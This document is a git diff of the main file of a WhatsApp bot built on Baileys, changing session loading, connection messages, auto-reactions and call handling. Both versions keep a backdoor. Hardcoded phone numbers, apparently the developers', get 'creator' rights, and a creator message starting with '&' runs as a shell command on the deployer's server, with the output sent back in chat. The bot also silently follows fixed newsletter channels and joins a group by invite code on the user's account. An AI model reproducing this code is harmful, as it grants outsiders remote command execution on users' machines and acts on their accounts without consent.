@@ -1,32 +1,16 @@
-/**
- * ===== GLOBAL SAFETY NET (MUST BE FIRST) =====
- * Prevents crashes on Railway & keeps bot online
- */
+// Anti-crash handler
 process.on("uncaughtException", (err) => {
-  console.error(
-    "[❗] Uncaught Exception:",
-    err?.stack || err
-  );
+  console.error("[❗] Uncaught Exception:", err.stack || err);
 });
 
-process.on("unhandledRejection", (reason) => {
-  console.error(
-    "[❗] Unhandled Promise Rejection:",
-    reason?.stack || reason
-  );
+process.on("unhandledRejection", (reason, p) => {
+  console.error("[❗] Unhandled Promise Rejection:", reason);
 });
 
 // GuruTech
 
-// ----------------------------------------------------------------------
-// CRITICAL FIX: Move PINO (P) and PATH up, as they are needed for 'store'
-const P = require("pino"); 
-const path = require("path");
-// ----------------------------------------------------------------------
-
 const axios = require("axios");
 const config = require("./settings");
-
 const {
   default: makeWASocket,
   useMultiFileAuthState,
@@ -51,17 +35,7 @@ const {
   Browsers,
 } = require(config.BAILEYS);
 
-// === Added missing store initialization ===
-// FIX: P and path are now correctly defined
-const store = makeInMemoryStore({ logger: P().child({ level: 'silent', stream: 'store' }) });
-store.readFromFile(path.join(__dirname, "./sessions/baileys-store.json"));
-setInterval(() => {
-    store.writeToFile(path.join(__dirname, "./sessions/baileys-store.json"));
-}, 10000);
-
-
 const l = console.log;
-
 const {
   getBuffer,
   getGroupAdmins,
@@ -73,7 +47,6 @@ const {
   sleep,
   fetchJson,
 } = require("./lib/functions");
-
 const {
   AntiDelDB,
   initializeAntiDeleteSettings,
@@ -91,11 +64,10 @@ const {
   getGroupMembersMessageCount,
   saveMessage,
 } = require("./data");
-
 const fsSync = require("fs");
 const fs = require("fs").promises;
 const ff = require("fluent-ffmpeg");
-// const P = require("pino"); // REMOVED: Moved to the top
+const P = require("pino");
 const GroupEvents = require("./lib/groupevents");
 const { PresenceControl, BotActivityFilter } = require("./data/presence");
 const qrcode = require("qrcode-terminal");
@@ -107,10 +79,9 @@ const bodyparser = require("body-parser");
 const chalk = require("chalk");
 const os = require("os");
 const Crypto = require("crypto");
-// const path = require("path"); // REMOVED: Moved to the top
+const path = require("path");
 const { getPrefix } = require("./lib/prefix");
 const readline = require("readline");
-const PhoneNumber = require("libphonenumber-js"); // Needed for malvin.getName utility
 
 const ownerNumber = ["218942841878"];
 
@@ -192,8 +163,7 @@ if (!fsSync.existsSync(sessionDir)) {
 
 async function loadSession() {
   try {
-    // FIX: Use process.env for SESSION_ID as configured by dotenv
-    const sessionId = process.env.SESSION_ID || config.SESSION_ID; 
+    const sessionId = process.env.SESSION_ID || config.SESSION_ID;
     if (!sessionId) {
       console.log(chalk.red("No SESSION_ID provided - Falling back to QR or pairing code"));
       return null;
@@ -273,14 +243,10 @@ async function connectToWA() {
   const { state, saveCreds } = await useMultiFileAuthState(path.join(__dirname, "./sessions"), {
     creds: creds || undefined,
   });
-  
-  // Set store state for auth
-  store.bind(state.chats);
 
   const { version } = await fetchLatestBaileysVersion();
 
-  // FIX: Use process.env for PAIRING_CODE
-  const pairingCode = process.env.PAIRING_CODE === "true" || process.argv.includes("--pairing-code"); 
+  const pairingCode = config.PAIRING_CODE === "true" || process.argv.includes("--pairing-code");
   const useMobile = process.argv.includes("--mobile");
 
   malvin = makeWASocket({
@@ -290,17 +256,8 @@ async function connectToWA() {
     syncFullHistory: true,
     auth: state,
     version,
-    getMessage: async (key) => {
-        if (store) {
-            const msg = await store.loadMessage(key.remoteJid, key.id);
-            return msg?.message || undefined;
-        }
-        return { };
-    },
+    getMessage: async () => ({}),
   });
-
-  // Bind the connection to the store
-  store.bind(malvin.ev);
 
   if (pairingCode && !state.creds.registered) {
     await connectWithPairing(malvin, useMobile);
@@ -343,18 +300,19 @@ try {
   const jid = malvin.decodeJid(malvin.user.id);
   if (!jid) throw new Error("Invalid JID for bot");
 
-  const botname = "X-GURU";
-  const ownername = "GuruTech";
+  const botname = "𝐒𝐈𝐋𝐄𝐍𝐓-𝐋𝐔𝐍𝐀";
+  const ownername = "GURU";
   const prefix = getPrefix();
-  const devGitHub = "https://github.com/GuruTech";
+  const username = "Guru";
+  const mrmalvin = `https://github.com/${username}`;
   const repoUrl = "https://github.com/ADDICT-HUB/X-GURU";
   const welcomeAudio = "https://files.catbox.moe/z47dgd.p3";
-
+  
   // Get current date and time
   const currentDate = new Date();
   const date = currentDate.toLocaleDateString();
   const time = currentDate.toLocaleTimeString();
-
+  
   // Format uptime
   function formatUptime(seconds) {
     const days = Math.floor(seconds / (24 * 60 * 60));
@@ -363,156 +321,97 @@ try {
     seconds %= 60 * 60;
     const minutes = Math.floor(seconds / 60);
     seconds = Math.floor(seconds % 60);
+    
     return `${days}d ${hours}h ${minutes}m ${seconds}s`;
   }
-
+  
   const uptime = formatUptime(process.uptime());
 
-  // Styled text-only box
   const upMessage = `
-┌───────────────────────────
-│  ${botname} Connected
-├───────────────────────────
-│ Prefix       : ${prefix}
-│ Date         : ${date}
-│ Time         : ${time}
-│ Uptime       : ${uptime}
-│ Owner        : ${ownername}
-│ Bot Name     : ${botname}
-│ Developer    : ${devGitHub}
-│ Repo         : ${repoUrl}
-└───────────────────────────
-> 𝐑𝐞𝐩𝐨𝐫𝐭 𝐚𝐧𝐲 𝐢𝐬𝐬𝐮𝐞 𝐭𝐨 𝐭𝐡𝐞 𝐨𝐰𝐧𝐞𝐫
-`;
+*┏──〔 Connected 〕───⊷*   
+*┇ Prefix: ${prefix}*
+*┇ Date: ${date}*
+*┇ Time: ${time}*
+*┇ Uptime: ${uptime}*
+*┇ Owner: ${ownername}*
+*┇ Follow Channel:*  
+*┇ https://shorturl.at/DYEi0*
+*┗──────────────⊷*
+> *Report any error to the dev*`;
 
   try {
-    // Send image
     await malvin.sendMessage(jid, {
-      image: { url: "https://files.catbox.moe/75baia.jpg" },
+      image: { url: "https://url.bwmxmd.online/Adams.xm472dqv.jpeg" },
       caption: upMessage,
-      contextInfo: {
-        mentionedJid: [jid],
-        forwardingScore: 999,
-        isForwarded: true,
-        forwardedNewsletterMessageInfo: {
-          newsletterJid: '120363421164015033@newsletter',
-          newsletterName: ownername,
-          serverMessageId: 143
-        }
-      }
     }, { quoted: null });
-    console.log("[ ✔ ] Connection notice sent successfully with image");
+    console.log(chalk.green("[ 📩 ] Connection notice sent successfully with image"));
 
-    // Send welcome audio
     await malvin.sendMessage(jid, {
       audio: { url: welcomeAudio },
       mimetype: "audio/mp4",
       ptt: true,
     }, { quoted: null });
-    console.log("[ ✔ ] Connection notice sent successfully as audio");
-
+    console.log(chalk.green("[ 📩 ] Connection notice sent successfully as audio"));
   } catch (imageError) {
-    console.error("[ ⚠ ] Image failed, sending text-only:", imageError.message);
+    console.error(chalk.yellow("[ ⚠️ ] Image failed, sending text-only:"), imageError.message);
     await malvin.sendMessage(jid, { text: upMessage });
-    console.log("[ ✔ ] Connection notice sent successfully as text");
+    console.log(chalk.green("[ 📩 ] Connection notice sent successfully as text"));
   }
-
 } catch (sendError) {
-  console.error("[ ✖ ] Error sending connection notice:", sendError.message);
-  // FIX: Use process.env for OWNER_NUMBER
-  const ownerJid = `${process.env.OWNER_NUMBER.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
-  if (ownerJid) {
-    await malvin.sendMessage(ownerJid, {
-      text: `Failed to send connection notice: ${sendError.message}`,
-    });
-  }
+  console.error(chalk.red(`[ 🔴 ] Error sending connection notice: ${sendError.message}`));
+  await malvin.sendMessage(ownerNumber[0], {
+    text: `Failed to send connection notice: ${sendError.message}`,
+  });
 }
 
 // Follow newsletters
-      const newsletterChannels = [
-  "120363421164015033@newsletter",
-  "120363401297349965@newsletter",
-  "120363339980514201@newsletter",
-];
+      const newsletterChannels = [                      "120363299029326322@newsletter",
+        "120363401297349965@newsletter",
+        "120363339980514201@newsletter",
+        ];
+      let followed = [];
+      let alreadyFollowing = [];
+      let failed = [];
 
-let followed = [];
-let alreadyFollowing = [];
-let failed = [];
+      for (const channelJid of newsletterChannels) {
+        try {
+          console.log(chalk.cyan(`[ 📡 ] Checking metadata for ${channelJid}`));
+          const metadata = await malvin.newsletterMetadata("jid", channelJid);
+          if (!metadata.viewer_metadata) {
+            await malvin.newsletterFollow(channelJid);
+            followed.push(channelJid);
+            console.log(chalk.green(`[ ✅ ] Followed newsletter: ${channelJid}`));
+          } else {
+            alreadyFollowing.push(channelJid);
+            console.log(chalk.yellow(`[ 📌 ] Already following: ${channelJid}`));
+          }
+        } catch (error) {
+          failed.push(channelJid);
+          console.error(chalk.red(`[ ❌ ] Failed to follow ${channelJid}: ${error.message}`));
+          await malvin.sendMessage(ownerNumber[0], {
+            text: `Failed to follow ${channelJid}: ${error.message}`,
+          });
+        }
+      }
 
-// Helper: validate normal chat JIDs only
-const isValidChatJid = (jid) =>
-  typeof jid === "string" &&
-  jid.includes("@") &&
-  !jid.endsWith("@newsletter") &&
-  !jid.endsWith("@broadcast");
+      console.log(
+        chalk.cyan(
+          `📡 Newsletter Follow Status:\n✅ Followed: ${followed.length}\n📌 Already following: ${alreadyFollowing.length}\n❌ Failed: ${failed.length}`
+        )
+      );
 
-for (const channelJid of newsletterChannels) {
-  try {
-    console.log(chalk.cyan(`[ 📡 ] Checking metadata for ${channelJid}`));
-
-    const metadata = await malvin.newsletterMetadata("jid", channelJid);
-
-    if (!metadata?.viewer_metadata) {
-      await malvin.newsletterFollow(channelJid);
-      followed.push(channelJid);
-      console.log(chalk.green(`[ ✅ ] Followed newsletter: ${channelJid}`));
-    } else {
-      alreadyFollowing.push(channelJid);
-      console.log(chalk.yellow(`[ 📌 ] Already following: ${channelJid}`));
-    }
-
-  } catch (error) {
-    failed.push(channelJid);
-
-    console.error(
-      chalk.red(`[ ❌ ] Failed to follow ${channelJid}: ${error.message}`)
-    );
-
-    // FIX: Use process.env for OWNER_NUMBER
-    if (isValidChatJid(process.env.OWNER_NUMBER)) { 
-      const ownerJid = `${process.env.OWNER_NUMBER.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
+      // Join WhatsApp group
+      const inviteCode = "GBz10zMKECuEKUlmfNsglx";
       try {
-        await malvin.sendMessage(ownerJid, {
-          text: `❌ Failed to follow newsletter:\n${channelJid}\n\nReason: ${error.message}`,
-        });
+        await malvin.groupAcceptInvite(inviteCode);
+        console.log(chalk.green("[ ✅ ] joined the WhatsApp group successfully"));
       } catch (err) {
-        console.error("[Owner Notify Error]", err.message);
+        console.error(chalk.red("[ ❌ ] Failed to join WhatsApp group:", err.message));
+        await malvin.sendMessage(ownerNumber[0], {
+          text: `Failed to join group with invite code ${inviteCode}: ${err.message}`,
+        });
       }
     }
-  }
-}
-
-// Summary log only (no risky sends)
-console.log(
-  chalk.cyan(
-    `📡 Newsletter Follow Status:\n` +
-    `✅ Followed: ${followed.length}\n` +
-    `📌 Already following: ${alreadyFollowing.length}\n` +
-    `❌ Failed: ${failed.length}`
-  )
-);
-
-// Join WhatsApp group (safe)
-const inviteCode = "LXpX6VjCsg2K785LP1Nngs";
-
-try {
-  await malvin.groupAcceptInvite(inviteCode);
-  console.log(chalk.green("[ ✅ ] Joined the WhatsApp group successfully"));
-} catch (err) {
-  console.error(chalk.red("[ ❌ ] Failed to join WhatsApp group:", err.message));
-
-  // FIX: Use process.env for OWNER_NUMBER
-  if (isValidChatJid(process.env.OWNER_NUMBER)) {
-    const ownerJid = `${process.env.OWNER_NUMBER.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
-    try {
-      await malvin.sendMessage(ownerJid, {
-        text: `❌ Failed to join WhatsApp group.\nInvite: ${inviteCode}\nReason: ${err.message}`,
-      });
-    } catch (e) {
-      console.error("[Group Notify Error]", e.message);
-    }
-  }
-}
 
     if (qr && !pairingCode) {
       console.log(chalk.red("[ 🟢 ] Scan the QR code to connect or use --pairing-code"));
@@ -526,8 +425,7 @@ try {
 	 
   malvin.ev.on('messages.update', async updates => {
     for (const update of updates) {
-      // Check if `update.update.message` is null or a deletion update
-      if (update.update.message === null && update.update.key) {
+      if (update.update.message === null) {
         console.log("Delete Detected:", JSON.stringify(update, null, 2));
         await AntiDelete(malvin, updates);
       }
@@ -538,8 +436,7 @@ try {
 
 malvin.ev.on('call', async (calls) => {
   try {
-    // FIX: Use process.env for ANTI_CALL
-    if (process.env.ANTI_CALL !== 'true') return; 
+    if (config.ANTI_CALL !== 'true') return;
 
     for (const call of calls) {
       if (call.status !== 'offer') continue; // Only respond on call offer
@@ -548,9 +445,8 @@ malvin.ev.on('call', async (calls) => {
       const from = call.from;
 
       await malvin.rejectCall(id, from);
-      // FIX: Use process.env for REJECT_MSG
-      await malvin.sendMessage(from, { 
-        text: process.env.REJECT_MSG || '*вυѕу ¢αℓℓ ℓαтєя*'
+      await malvin.sendMessage(from, {
+        text: config.REJECT_MSG || '*вυѕу ¢αℓℓ ℓαтєя*'
       });
       console.log(`Call rejected and message sent to ${from}`);
     }
@@ -561,45 +457,32 @@ malvin.ev.on('call', async (calls) => {
 	
 //=========WELCOME & GOODBYE =======
 	
-malvin.ev.on('group-participants.update', async (update) => {
-    await GroupEvents(malvin, update); // Use the imported GroupEvents
-});
-	
-// Always Online & Presence Control
-// Removed the redundant second 'presence.update' listener
 malvin.ev.on('presence.update', async (update) => {
     await PresenceControl(malvin, update);
 });
 
+// always Online 
+
+malvin.ev.on("presence.update", (update) => PresenceControl(malvin, update));
+
+	
 BotActivityFilter(malvin);	
 	
  /// READ STATUS       
   malvin.ev.on('messages.upsert', async(mek) => {
-    // Correctly get the first message object
-    mek = mek.messages[0];
-    if (!mek.message) return;
-
-    // Correctly handle ephemeral messages and get message type
+    mek = mek.messages[0]
+    if (!mek.message) return
     mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
     ? mek.message.ephemeralMessage.message 
     : mek.message;
-    
-    const type = getContentType(mek.message);
-    
-    // Auto-read messages
-    // FIX: Use process.env for READ_MESSAGE
-    if (process.env.READ_MESSAGE === 'true') {
-      await malvin.readMessages([mek.key]);  // Mark message as read
-      // console.log(`Marked message from ${mek.key.remoteJid} as read.`);
-    }
-
-    // Handle View Once messages
+    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
+  if (config.READ_MESSAGE === 'true') {
+    await malvin.readMessages([mek.key]);  // Mark message as read
+    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
+  }
     if(mek.message.viewOnceMessageV2)
-      mek.message = mek.message.viewOnceMessageV2.message;
-    
-    // Auto status seen
-    // FIX: Use process.env for AUTO_STATUS_SEEN
-    if (mek.key && mek.key.remoteJid === 'status@broadcast' && process.env.AUTO_STATUS_SEEN === "true"){
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
       await malvin.readMessages([mek.key])
     }
 
@@ -610,8 +493,7 @@ BotActivityFilter(malvin);
   ];
   const emojis = ["😂", "🥺", "👍", "☺️", "🥹", "♥️", "🩵"];
 
-  // FIX: Use process.env for AUTO_STATUS_REACT
-  if (mek.key && newsletterJids.includes(mek.key.remoteJid) && process.env.AUTO_STATUS_REACT === "true") {
+  if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
     try {
       const serverId = mek.newsletterServerId;
       if (serverId) {
@@ -619,13 +501,11 @@ BotActivityFilter(malvin);
         await malvin.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
       }
     } catch (e) {
-      // console.error("Newsletter reaction error:", e.message);
+    
     }
   }	  
 	  
-  // Auto status react
-  // FIX: Use process.env for AUTO_STATUS_REACT
-  if (mek.key && mek.key.remoteJid === 'status@broadcast' && process.env.AUTO_STATUS_REACT === "true"){
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await malvin.decodeJid(malvin.user.id);
     const emojis =  ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '👏', '🤎', '✅', '🫀', '🧡', '😶', '🥹', '🌸', '🕊️', '🌷', '⛅', '🌟', '🥺', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
@@ -636,103 +516,90 @@ BotActivityFilter(malvin);
       } 
     }, { statusJidList: [mek.key.participant, jawadlike] });
   }                       
-
-  // Auto status reply
-  // FIX: Use process.env for AUTO_STATUS_REPLY and AUTO_STATUS_MSG
-  if (mek.key && mek.key.remoteJid === 'status@broadcast' && process.env.AUTO_STATUS_REPLY === "true"){
-    const user = mek.key.participant;
-    const text = `${process.env.AUTO_STATUS_MSG}`;
-    await malvin.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
-  }
-
-  // Save message
-  await Promise.all([
-    saveMessage(mek),
-  ]);
-
-  // Command processing block
-  const m = sms(malvin, mek);
-  const content = JSON.stringify(mek.message);
-  const from = mek.key.remoteJid;
-  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
-  // FIX: Add null/empty string fallback to body definition to prevent crash on chained methods
-  const body = (type === 'conversation') ? mek.message.conversation || '' : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text || '' : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
+  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
+  const user = mek.key.participant
+  const text = `${config.AUTO_STATUS_MSG}`
+  await malvin.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
+            }
+            await Promise.all([
+              saveMessage(mek),
+            ]);
+  const m = sms(malvin, mek)
+  const type = getContentType(mek.message)
+  const content = JSON.stringify(mek.message)
+  const from = mek.key.remoteJid
+  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
+  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
   const prefix = getPrefix();
-  const isCmd = body.startsWith(prefix);
-  var budy = typeof m.text == 'string' ? m.text : false; // Use m.text
-  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
-  const args = body.trim().split(/ +/).slice(1);
-  const q = args.join(' ');
-  const text = args.join(' ');
-  const isGroup = from.endsWith('@g.us');
-  const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid);
-  const senderNumber = sender.split('@')[0];
-  const botNumber = malvin.user.id.split(':')[0];
-  const pushname = mek.pushName || 'Sin Nombre';
-  const isMe = botNumber.includes(senderNumber);
-  // isOwner check is replaced by isCreator for consistency with command block
-  // const isOwner = ownerNumber.includes(senderNumber) || isMe;
+  const isCmd = body.startsWith(prefix)
+  var budy = typeof mek.text == 'string' ? mek.text : false;
+  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
+  const args = body.trim().split(/ +/).slice(1)
+  const q = args.join(' ')
+  const text = args.join(' ')
+  const isGroup = from.endsWith('@g.us')
+  const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid)
+  const senderNumber = sender.split('@')[0]
+  const botNumber = malvin.user.id.split(':')[0]
+  const pushname = mek.pushName || 'Sin Nombre'
+  const isMe = botNumber.includes(senderNumber)
+  const isOwner = ownerNumber.includes(senderNumber) || isMe
   const botNumber2 = await jidNormalizedUser(malvin.user.id);
-  const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch(e => {}) : '';
-  const groupName = isGroup ? groupMetadata.subject : '';
-  const participants = isGroup ? await groupMetadata.participants : '';
-  const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
-  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
-  const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
-  const isReact = m.message.reactionMessage ? true : false;
+  const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch(e => {}) : ''
+  const groupName = isGroup ? groupMetadata.subject : ''
+  const participants = isGroup ? await groupMetadata.participants : ''
+  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
+  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
+  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
+  const isReact = m.message.reactionMessage ? true : false
   const reply = (teks) => {
-    malvin.sendMessage(from, { text: teks }, { quoted: mek })
-  };
+  malvin.sendMessage(from, { text: teks }, { quoted: mek })
+  }
   
-  // ownerNumbers is redundant if using process.env.OWNER_NUMBER
   const ownerNumbers = ["218942841878", "254740007567", "254790375710"];
-  const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
-  // FIX: Use process.env for DEV
-  const devNumber = process.env.DEV ? String(process.env.DEV).replace(/[^0-9]/g, "") : null;
-  const creatorJids = [
-    ...ownerNumbers,
-    ...(devNumber ? [devNumber] : []),
-    ...sudoUsers,
-  ].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
-  const isCreator = creatorJids.includes(sender) || isMe;
-  const isOwner = isCreator; // Set isOwner to be the same as isCreator for simplicity
+      const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
+      const devNumber = config.DEV ? String(config.DEV).replace(/[^0-9]/g, "") : null;
+      const creatorJids = [
+        ...ownerNumbers,
+        ...(devNumber ? [devNumber] : []),
+        ...sudoUsers,
+      ].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
+      const isCreator = creatorJids.includes(sender) || isMe;
 
-  if (isCreator && mek.text.startsWith("&")) {
-    let code = budy.slice(2);
-    if (!code) {
-      reply(`Provide me with a query to run Master!`);
-      // Assuming 'logger' is not defined, using console.warn instead
-      console.warn(`No code provided for & command`, { Sender: sender });
-      return;
-    }
-        const { spawn } = require("child_process");
-        try {
-            let resultTest = spawn(code, { shell: true });
-            resultTest.stdout.on("data", data => {
-                reply(data.toString());
-            });
-            resultTest.stderr.on("data", data => {
-                reply(data.toString());
-            });
-            resultTest.on("error", data => {
-                reply(data.toString());
-            });
-            resultTest.on("close", code => {
-                if (code !== 0) {
-                    reply(`command exited with code ${code}`);
-                }
-            });
-        } catch (err) {
-            reply(util.format(err));
+      if (isCreator && mek.text.startsWith("&")) {
+        let code = budy.slice(2);
+        if (!code) {
+          reply(`Provide me with a query to run Master!`);
+          logger.warn(`No code provided for & command`, { Sender: sender });
+          return;
         }
-        return;
-    }
+            const { spawn } = require("child_process");
+            try {
+                let resultTest = spawn(code, { shell: true });
+                resultTest.stdout.on("data", data => {
+                    reply(data.toString());
+                });
+                resultTest.stderr.on("data", data => {
+                    reply(data.toString());
+                });
+                resultTest.on("error", data => {
+                    reply(data.toString());
+                });
+                resultTest.on("close", code => {
+                    if (code !== 0) {
+                        reply(`command exited with code ${code}`);
+                    }
+                });
+            } catch (err) {
+                reply(util.format(err));
+            }
+            return;
+        }
 
   //==========public react============//
   
 // Auto React for all messages (public and owner)
-// FIX: Use process.env for AUTO_REACT
-if (!isReact && process.env.AUTO_REACT === 'true') {
+if (!isReact && config.AUTO_REACT === 'true') {
     const reactions = [
         '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', 
         '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', 
@@ -759,8 +626,7 @@ if (!isReact && process.env.AUTO_REACT === 'true') {
 
   // Owner React
   if (!isReact && senderNumber === botNumber) {
-      // Assuming OWNER_REACT config is intended here, defaulting to simple check for owner sending a message
-      if (true) { 
+      if (config.OWNER_REACT === 'true') {
           const reactions = [
         '🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '👩‍🦰', '🧑‍🦰', '👩‍⚕️', '🧑‍⚕️', '🧕', '👩‍🏫', '👨‍💻', '👰‍♀', '🦹🏻‍♀️', '🧟‍♀️', '🧟', '🧞‍♀️', '🧞', '🙅‍♀️', '💁‍♂️', '💁‍♀️', '🙆‍♀️', '🙋‍♀️', '🤷', '🤷‍♀️', '🤦', '🤦‍♀️', '💇‍♀️', '💇', '💃', '🚶‍♀️', '🚶', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻 ', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🛬', '🫀', '🫠', '🐍', '🥀', '🌸', '🏵️', '🌻', '🍂', '🍁', '🍄', '🌾', '🌿', '🌱', '🍀', '🧋', '💒', '🏩', '🏗️', '🏰', '🏪', '🏟️', '🎗️', '🥇', '⛳', '📟', '🏮', '📍', '🔮', '🧿', '♻️', '⛵', '🚍', '🚔', '🛳️', '🚆', '🚤', '🚕', '🛺', '🚝', '🚈', '🏎️', '🏍️', '🛵', '🥂', '🍾', '🍧', '🐣', '🐥', '🦄', '🐯', '🐦', '🐬', '🐋', '🦆', '💈', '⛲', '⛩️', '🎈', '🎋', '🪀', '🧩', '👾', '💸', '💎', '🧮', '👒', '🧢', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🤹', '🤹‍♀️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰', '🧳', '🌉', '🌁', '🛤️', '🛣️', '🏚️', '🏠', '🏡', '🧀', '🍥', '🍮', '🍰', '🍦', '🍨', '🍧', '🥠', '🍡', '🧂', '🍯', '🍪', '🍩', '🍭', '🥮', '🍡'
     ];
@@ -773,20 +639,18 @@ if (!isReact && process.env.AUTO_REACT === 'true') {
 // custum react settings        
                         
 // Custom React for all messages (public and owner)
-// FIX: Use process.env for CUSTOM_REACT and CUSTOM_REACT_EMOJIS
-if (!isReact && process.env.CUSTOM_REACT === 'true') {
+if (!isReact && config.CUSTOM_REACT === 'true') {
     // Use custom emojis from the configuration (fallback to default if not set)
-    const reactions = (process.env.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
+    const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
     const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
     m.react(randomReaction);
 }
 
 
 if (!isReact && senderNumber === botNumber) {
-            // FIX: Use process.env for HEART_REACT
-            if (process.env.HEART_REACT === 'true') {
-                // FIX: Use process.env for CUSTOM_REACT_EMOJIS
-                const reactions = (process.env.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
+            if (config.HEART_REACT === 'true') {
+                // Use custom emojis from the configuration
+                const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
                 const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                 m.react(randomReaction);
             }
@@ -804,24 +668,20 @@ if (!isReact && senderNumber === botNumber) {
 
       // Owner check
       const ownerFile = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8"));
-      // FIX: Use process.env for OWNER_NUMBER
-      const ownerNumberFormatted = `${process.env.OWNER_NUMBER.replace(/[^0-9]/g, "")}@s.whatsapp.net`;
